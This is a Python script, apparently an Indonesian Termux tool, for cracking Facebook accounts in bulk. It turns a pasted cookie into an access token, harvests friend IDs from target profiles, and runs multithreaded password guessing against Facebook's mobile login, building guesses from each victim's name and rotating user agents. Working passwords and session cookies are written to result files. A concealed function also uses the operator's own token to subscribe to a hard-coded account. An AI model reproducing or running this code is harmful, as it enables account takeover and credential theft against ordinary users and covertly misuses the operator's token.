import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
import subprocess
import uuid
from time import sleep
import unicodedata
import threading
import hashlib
from rich import pretty
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred

class Warna_Gua:
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m'
    O = '\x1b[1;96m'
    N = '\x1b[0m'
    Z = "\033[1;30m"
    OO = '\x1b[38;5;208m'
    x = '\33[m'
    m = '\x1b[1;91m'
    k = '\033[93m'
    h = '\x1b[1;92m'
    hh = '\033[32m'
    u = '\033[95m'
    kk = '\033[33m'
    b = '\33[1;96m'
    o = '\x1b[38;5;208m'

class UserAgentGenerator:
    def __init__(self):
        self.ugen = []
        self.generate_user_agents()

    def generate_user_agents(self):
        # 1. Update ke Chrome Terbaru (v120 - v131)
        # 2. Sinkronisasi Model HP dengan Build Number yang Logis
        
        # Format: (Model, Build_Prefix, Android_Ver)
        android_devices = [
            ("Samsung Galaxy S24 Ultra", "UP1A.231005.007", "14"),
            ("Pixel 8 Pro", "UD1A.230805.019", "14"),
            ("Redmi Note 13 Pro", "UKQ1.230917.001", "13"),
            ("Oppo Reno11 Pro", "TP1A.220905.001", "13"),
            ("Infinix Note 40", "SP1A.210812.016", "12"),
            ("V2324A", "TP1A.220624.014", "13"), # Vivo X100
            ("RMX3820", "UKQ1.230924.001", "14"), # Realme GT
        ]

        # Generate Android Mobile UA
        for model, build, av in android_devices:
            for _ in range(2000):
                cr_ver = f"{random.randint(120, 131)}.0.{random.randint(6000, 6800)}.{random.randint(100, 190)}"
                # Menggunakan format Dalvik & Chrome Mobile
                ua = f"Mozilla/5.0 (Linux; Android {av}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{cr_ver} Mobile Safari/537.36"
                self.ugen.append(ua)

        # Generate PC/Windows UA (Chrome v130+)
        for _ in range(5000):
            win_ver = random.choice(["10.0", "11.0"])
            cr_ver = f"{random.randint(125, 131)}.0.{random.randint(6000, 6800)}.{random.randint(100, 190)}"
            ua = f"Mozilla/5.0 (Windows NT {win_ver}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cr_ver} Safari/537.36"
            self.ugen.append(ua)

        # Generate iOS UA (iPhone 15/16 Pro)
        for _ in range(5000):
            ios_ver = random.choice(["17_5", "18_0", "18_1"])
            safari = random.randint(600, 700)
            ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            self.ugen.append(ua)

    def get_random_ua(self):
        return random.choice(self.ugen)

# Cara penggunaan di dalam script M1:
# ua = UserAgentGenerator().get_random_ua()

class FacebookLogin:
    def __init__(self):
        self.ses = requests.Session()
        self.tokenku = []
        self.console = Console()

    def login(self):
        try:
            # Mengikuti pola file .token.txt dan .cok.txt dari kode bawah
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
            self.tokenku.append(token)
            
            try:
                # Validasi Token & Cookie ke Graph API
                sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + self.tokenku[0], cookies={'cookie': cok})
                data = json.loads(sy.text)
                
                if "name" in data:
                    # Jika berhasil, jalankan bot dan return data
                    self.bot()
                    return data['name'], data['id']
                else:
                    self.login_lagi()
                    return None, None
            except KeyError:
                self.login_lagi()
                return None, None
            except requests.exceptions.ConnectionError:
                print(f'{Warna_Gua.M}# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN')
                exit()
        except IOError:
            self.login_lagi()
            return None, None

    def login_lagi(self):
        try:
            os.system('clear')
            # Menggunakan skema warna dari class Warna_Gua
            cookie = input(f'  [{Warna_Gua.h}•{Warna_Gua.x}] Koki : {Warna_Gua.K}')
            open(".cok.txt", "w").write(cookie)
            
            with requests.Session() as rsn:
                # Header disesuaikan dengan permintaan kode bawah
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                
                # Endpoint khusus menggunakan client_id Instagram
                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
                
                # Token biasanya berada di headers response pada endpoint ini
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open(".token.txt", "w").write(token)
                    print(f'{Warna_Gua.h}Login Succes')
                    print(f'  {Warna_Gua.x}[{Warna_Gua.h}•{Warna_Gua.x}]{Warna_Gua.h} Berhasil Jalankan Lagi Perintahnya!!!!{Warna_Gua.x} ')
                    time.sleep(1)
                    exit()
                else:
                    print(f'{Warna_Gua.m}Failled Get Token')
                    time.sleep(2)
                    exit()

        except Exception as e:
            os.system("rm -f .token.txt")
            os.system("rm -f .cok.txt")
            print(f'  {Warna_Gua.x}[{Warna_Gua.k}x{Warna_Gua.x}]{Warna_Gua.m} LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!')
            print(e)
            exit()

    def bot(self):
        try:
            # Pastikan self.tokenku sudah terisi
            requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(self.tokenku[0]))
        except:
            pass



class FacebookMenu:
    def __init__(self, name, user_id):
        self.name = name
        self.user_id = user_id
        self.id = []
        self.id2 = []
        self.loop = 0
        self.ok = 0
        self.cp = 0

    def display_menu(self):
        os.system('clear')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} User Information")
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Fullnames :{Warna_Gua.b} {self.name}')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Useruidzs :{Warna_Gua.b} {self.user_id}')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} ScVersion :{Warna_Gua.b} Lite Script')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P} Telegrams :{Warna_Gua.b} @AraiiXyzz')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Script Features")
        print(f'    {Warna_Gua.b}1{Warna_Gua.P}. Crack From Publick Random ({Warna_Gua.b}Unlimited Dump{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}0{Warna_Gua.P}. Exitz From Tools')
        AX = input(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›{Warna_Gua.b} ')
        if AX in ['1']:
            self.publik()
        elif AX in ['0']:
            self.remove_cookie()
            print(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›Moved the cookies ')
            exit()
        else:
            print(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›Invalid Option ')
            self.display_menu()

    def publik(self):
        try:
            token = open('.token.txt', 'r').read()
            cok = open('.cok.txt', 'r').read()
        except IOError:
            print(f" [{Warna_Gua.m}!{Warna_Gua.x}] Token/Cookie tidak ditemukan.")
            exit()

        try:
            print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Mode Dump Massal")
            kumpulkan = int(input(f'    {Warna_Gua.b}＼{Warna_Gua.P} Mau Berapa Id Target? : {Warna_Gua.b}'))
        except ValueError:
            exit()

        if kumpulkan < 1 or kumpulkan > 1000:
            exit()

        bilangan = 0
        target_uids = [] 
        for _ in range(kumpulkan):
            bilangan += 1
            masukan = input(f'    {Warna_Gua.b}＼{Warna_Gua.P} Masukkan Id Target Ke-{str(bilangan)} : {Warna_Gua.b}')
            target_uids.append(masukan)

        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Sedang Mengambil Data Teman...")

        for user in target_uids:
            try:
                headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"}
                params = {'access_token': token, 'fields': "friends"}
                
                response = requests.get(
                    f'https://graph.facebook.com/{user}',
                    params=params,
                    headers=headers,
                    cookies={'cookie': cok}
                ).json()

                if 'friends' in response:
                    for xr in response['friends']['data']:
                        try:
                            format_id = f"{xr['id']}|{xr['name']}"
                            if format_id not in self.id:
                                self.id.append(format_id)
                                sys.stdout.write(f"\r    {Warna_Gua.b}＼{Warna_Gua.P} Berhasil Dump : {Warna_Gua.H}{len(self.id)}{Warna_Gua.P} ID")
                                sys.stdout.flush()
                        except:
                            continue
                else:
                    print(f"\n {Warna_Gua.m}[!]{Warna_Gua.x} Target {user} Private atau Token Mati.")
            
            except requests.exceptions.ConnectionError:
                exit()
            except:
                pass

        try:
            print(f"\n\n {Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Total ID Terkumpul : {Warna_Gua.H}{len(self.id)}")
            self.setting()
        except:
            exit()


    def setting(self):
        print(" ")
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}] {Warna_Gua.P}Your Choice Targets")
        print(f'    {Warna_Gua.b}1{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}OLD{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}2{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}NEW{Warna_Gua.P}) ')
        print(f'    {Warna_Gua.b}3{Warna_Gua.P}. Priority Targets ({Warna_Gua.b}RDM{Warna_Gua.P}) ')
        hu = input(f'{Warna_Gua.b}     ╰─{Warna_Gua.P}›{Warna_Gua.b} ')
        if hu in ['1', '01']:
            for Old in sorted(self.id):
                self.id2.append(Old)
        elif hu in ['2', '02']:
            New = []
            for Random in sorted(self.id):
                New.append(Random)
            bcm = len(New)
            bcmi = (bcm - 1)
            for xmud in range(bcm):
                self.id2.append(New[bcmi])
                bcmi -= 1
        elif hu in ['3', '03']:
            for Random in self.id:
                xx = random.randint(0, len(self.id2))
                self.id2.insert(xx, Random)
        else:
            print(' [!] Pilih Yang Bener ')
            exit()
        self.passwordlist()

    def passwordlist(self):
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Result Save In ")
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P}./sdcard/RESULT/OK/{datetime.datetime.now().strftime("%d-%m-%Y")}.txt')
        print(f'    {Warna_Gua.b}＼{Warna_Gua.P}./sdcard/RESULT/CP/{datetime.datetime.now().strftime("%d-%m-%Y")}.txt')
        print(f" \n{Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.P} Crack Process Begins - Use Airplane Mode Every 500 ID\n ")
        
        with tred(max_workers=30) as pool:
            for user in self.id2: # Pastikan self.id2 berisi "id|nama"
                try:
                    idf, nama = user.split('|')[0], user.split('|')[1].lower()
                    if len(nama) < 3: continue
                    
                    # --- STRATEGI PASSWORD MANJUR (Indo Trend) ---
                    depan = nama.split(' ')[0]
                    pw_list = []
                    
                    if len(nama) >= 6:
                        pw_list.append(nama)
                        pw_list.append(depan + '123')
                        pw_list.append(depan + '1234')
                        pw_list.append(depan + '12345')
                        pw_list.append(depan + '01')
                        pw_list.append(depan + '02')
                        pw_list.append(depan + 'ganteng')
                        pw_list.append(depan + 'cantik')
                        pw_list.append(depan + 'gaming')
                        pw_list.append(depan + '123456')
                    else:
                        pw_list.append(nama + '123')
                        pw_list.append(nama + '12345')
                        pw_list.append('sayang')
                        pw_list.append('bismillah')
                        pw_list.append('anjing')

                    pool.submit(self.M1, idf, pw_list)
                except Exception as e:
                    continue

    def M1(self, idf, pw_list):
        print(f" {Warna_Gua.b}[{Warna_Gua.P}●{Warna_Gua.b}]{Warna_Gua.H} GassBoss {Warna_Gua.u}{self.loop} {Warna_Gua.P}Collected {Warna_Gua.u}{str(len(self.id))} {Warna_Gua.P}Success {Warna_Gua.b}{self.ok} {Warna_Gua.P}Failed {Warna_Gua.k}{self.cp}", end="\r")
        sys.stdout.flush()
        ses = requests.Session()
        for pw in pw_list:
            try:
                # User Agent diperbarui ke versi lebih stabil
                ua = UserAgentGenerator().get_random_ua()
                
                # Step 1: Ambil parameter login
                link_login = f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=fx_reauth&_rdr'
                res1 = ses.get(link_login, headers={'User-Agent': ua})
                
                # Regex diperkuat agar tidak error jika element tidak ditemukan
                try:
                    lsd = re.search('name="lsd" value="(.*?)"', res1.text).group(1)
                    jazoest = re.search('name="jazoest" value="(.*?)"', res1.text).group(1)
                except:
                    continue

                # Step 2: Post Data (Format Encpass yang benar)
                data = {
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'uid': idf,
                    'next': 'https://m.facebook.com/login/save-device/',
                    'flow': 'fx_reauth',
                    'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pw}'
                }

                headers = {
                    "Host": "m.facebook.com",
                    "content-type": "application/x-www-form-urlencoded",
                    "user-agent": ua,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "referer": link_login,
                    "origin": "https://m.facebook.com",
                }

                po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', 
                              data=data, headers=headers, allow_redirects=False)

                if "c_user" in ses.cookies.get_dict():
                    kuki = ";".join([f"{k}={v}" for k, v in ses.cookies.get_dict().items()])
                    print(f"\r{Warna_Gua.H} [OK] {idf} | {pw} | {kuki}{Warna_Gua.P}")
                    with open("hasil_ok.txt", "a") as f:
                        f.write(f"{idf}|{pw}|{kuki}\n")
                    self.ok += 1
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f"\r{Warna_Gua.K} [CP] {idf} | {pw}{Warna_Gua.P}")
                    with open("hasil_cp.txt", "a") as f:
                        f.write(f"{idf}|{pw}\n")
                    self.cp += 1
                    break
                
            except requests.exceptions.ConnectionError:
                time.sleep(10)
            except:
                continue
        
        self.loop += 1


class Main:
    def __init__(self):
        self.user_agent_generator = UserAgentGenerator()
        self.facebook_login = FacebookLogin()
        self.run()

    def run(self):
        name, user_id = self.facebook_login.login()
        if name and user_id:
            menu = FacebookMenu(name, user_id)
            menu.display_menu()
        else:
            self.facebook_login.login_lagi()

if __name__ == '__main__':
    try:
        os.mkdir('/sdcard/ARAIIXYZZ')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/TOKEN')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/COOKIES')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT/HASIL OK')
    except: pass
    try:
        os.mkdir('/sdcard/ARAIIXYZZ/RESULT/HASIL CP')
    except: pass
    Main()